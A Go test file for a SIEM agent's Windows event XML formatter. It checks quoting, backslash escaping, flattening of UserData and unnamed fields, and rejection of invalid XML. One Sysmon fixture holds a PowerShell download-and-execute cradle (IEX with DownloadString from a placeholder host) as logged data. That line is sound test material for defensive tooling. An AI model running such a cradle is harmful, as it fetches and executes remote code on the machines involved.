package agent_test

import (
	"strings"
	"testing"

	"github.com/siem-platform/agent/internal/winevent"
)

const ns = `xmlns="http://schemas.microsoft.com/win/2004/08/events/event"`

func TestFormatSecurityLogonFailure(t *testing.T) {
	xml := `<Event ` + ns + `><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"/>` +
		`<EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>` +
		`<Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime="2026-10-18T03:00:00.1234567Z"/>` +
		`<EventRecordID>98765</EventRecordID><Correlation/><Execution ProcessID="672" ThreadID="1234"/>` +
		`<Channel>Security</Channel><Computer>WIN01.corp.local</Computer><Security/></System>` +
		`<EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="TargetUserName">administrator</Data>` +
		`<Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="WorkstationName">KALI</Data>` +
		`<Data Name="IpAddress">203.0.113.7</Data><Data Name="IpPort">51234</Data></EventData></Event>`
	got, err := winevent.FormatXML([]byte(xml))
	if err != nil {
		t.Fatal(err)
	}
	want := `EventID=4625 Channel="Security" Provider="Microsoft-Windows-Security-Auditing" Computer="WIN01.corp.local" ` +
		`RecordID="98765" Level="0" Task="12544" Opcode="0" Keywords="0x8010000000000000" ` +
		`TimeCreated="2026-10-18T03:00:00.1234567Z" ProcessID="672" IpAddress="203.0.113.7" IpPort="51234" ` +
		`LogonType="3" SubjectUserSid="S-1-0-0" TargetDomainName="CORP" TargetUserName="administrator" WorkstationName="KALI"`
	if got != want {
		t.Fatalf("got\n%s\nwant\n%s", got, want)
	}
}

func TestFormatKeepsCommandLinesOnOneLineAndQuotable(t *testing.T) {
	xml := `<Event ` + ns + `><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>` +
		`<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN01</Computer></System><EventData>` +
		`<Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>` +
		`<Data Name="CommandLine">powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"&#13;&#10;whoami</Data>` +
		`<Data Name="CurrentDirectory">C:\Temp\</Data><Data Name="Share">\\fileserver\c$</Data>` +
		`<Data Name="Defender Value">HKLM\Exclusions = 0x0</Data><Data Name="Channel">shadowed</Data></EventData></Event>`
	got, err := winevent.FormatXML([]byte(xml))
	if err != nil {
		t.Fatal(err)
	}
	for _, part := range []string{
		`EventID=1 Channel="Microsoft-Windows-Sysmon/Operational"`,
		`CommandLine="powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\" whoami"`,
		`Image="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`, // paths stay readable
		`CurrentDirectory="C:\Temp\\"`, // trailing backslash can't escape the closing quote
		`Share="\\\fileserver\c$"`,     // a backslash before a backslash is doubled
		`DefenderValue="HKLM\Exclusions = 0x0"`,
		`Data_Channel="shadowed"`, // event data never overrides System fields
	} {
		if !strings.Contains(got, part) {
			t.Errorf("missing %q in\n%s", part, got)
		}
	}
	if strings.ContainsAny(got, "\r\n") {
		t.Errorf("line break in output: %q", got)
	}
}

func TestFormatUserDataAndUnnamedData(t *testing.T) {
	cleared := `<Event ` + ns + `><System><Provider Name="Microsoft-Windows-Eventlog"/><EventID>1102</EventID>` +
		`<Channel>Security</Channel><Computer>WIN01</Computer></System><UserData>` +
		`<LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">` +
		`<SubjectUserSid>S-1-5-21-1-1001</SubjectUserSid><SubjectUserName>bob</SubjectUserName>` +
		`<SubjectDomainName>CORP</SubjectDomainName></LogFileCleared></UserData></Event>`
	got, err := winevent.FormatXML([]byte(cleared))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(got, "EventID=1102 ") || !strings.Contains(got, `SubjectUserName="bob"`) ||
		!strings.Contains(got, `SubjectDomainName="CORP"`) {
		t.Fatalf("UserData not flattened: %s", got)
	}

	app := `<Event ` + ns + `><System><Provider Name="MyApp"/><EventID Qualifiers="0">1000</EventID><Channel>Application</Channel>` +
		`</System><EventData><Data>first</Data><Data>second</Data></EventData></Event>`
	got, err = winevent.FormatXML([]byte(app))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, `Data1="first" Data2="second"`) {
		t.Fatalf("unnamed data: %s", got)
	}
}

func TestFormatRejectsJunk(t *testing.T) {
	if _, err := winevent.FormatXML([]byte(`not xml`)); err == nil {
		t.Error("expected an error for invalid XML")
	}
	if _, err := winevent.FormatXML([]byte(`<Event><System></System></Event>`)); err == nil {
		t.Error("expected an error for an event without EventID")
	}
}
